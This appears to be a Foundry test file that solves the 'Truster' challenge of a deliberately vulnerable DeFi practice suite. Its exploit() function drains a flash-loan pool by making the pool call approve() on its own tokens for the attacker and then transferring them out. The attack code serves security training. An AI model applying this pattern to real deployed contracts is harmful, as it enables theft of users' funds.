// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../src/DamnValuableToken.sol";
import "../../src/truster/TrusterLenderPool.sol";

contract TrusterTest is BaseTest {
    // Pool has 1000000 ETH in balance
    uint256 TOKENS_IN_POOL = 1000000 ether;

    DamnValuableToken token;
    TrusterLenderPool pool;

    address payable attacker;

    constructor() {
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";

        preSetup(2, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];

        // setup contracts
        token = new DamnValuableToken();
        vm.label(address(token), "DamnValuableToken");
        pool = new TrusterLenderPool((token));
        vm.label(address(pool), "TrusterLenderPool");

        token.transfer(address(pool), TOKENS_IN_POOL);

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(attacker), 0);
    }

    function test_ExploitTruster() public {
        runTest();
    }

    function exploit() internal override {
        // Pool lets us to call any function on any target...
        // Just approve all it's tokens and transferFrom them after.
        vm.startPrank(attacker);
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        pool.flashLoan(
            0,
            attacker,
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                attacker,
                token.balanceOf(address(pool))
            )
        );
        token.transferFrom(
            address(pool),
            attacker,
            token.balanceOf(address(pool))
        );
        vm.stopPrank();
    }

    function success() internal override {
        // Attacker has taken all tokens from the pool
        assertEq(token.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
